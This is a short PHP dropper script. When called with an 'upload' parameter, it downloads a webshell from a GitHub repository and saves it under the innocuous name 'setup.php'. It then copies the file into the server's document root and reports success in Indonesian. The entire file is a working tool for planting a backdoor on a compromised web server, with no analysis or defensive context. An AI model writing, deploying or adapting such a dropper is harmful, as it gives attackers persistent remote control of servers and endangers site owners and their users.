<?php 

if (isset($_GET['upload'])) {

$sc = file_get_contents("https://raw.githubusercontent.com/florienzh4x/webshell/master/mini2.php");
$root = $_SERVER['DOCUMENT_ROOT'];
$nama = "setup.php";
$bikin = fopen($nama, "w");
		 fwrite($bikin, $sc);
		 fclose($bikin);
$dir = $root.'/'.$nama;
$copy = @copy($nama, $dir);
if ($copy) {
	echo "sukses dir utama";
} else {
	echo "failed dir utama, ada di dir ini";
}

} else {
	echo "";
}
?>
